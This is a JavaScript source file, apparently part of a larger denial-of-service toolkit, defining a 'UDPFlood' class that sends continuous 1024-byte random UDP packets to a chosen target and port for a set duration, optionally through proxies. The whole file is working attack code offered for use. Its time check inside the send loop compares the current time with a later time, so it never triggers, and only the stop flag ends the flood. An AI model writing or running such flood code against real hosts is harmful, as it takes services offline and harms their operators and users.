import dgram from 'dgram';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';

/**
 * UDP Flood Attack
 */
export class UDPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            const payload = Tools.randomBytesBuffer(1024);

            const sendPacket = () => {
                if (!this.active || Date.now() >= Date.now() + (this.duration * 1000)) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                Tools.sendTo(socket, payload, this.port, this.target);
                setImmediate(sendPacket);
            };

            sendPacket();
        });
    }

    stop() {
        this.active = false;
    }
}
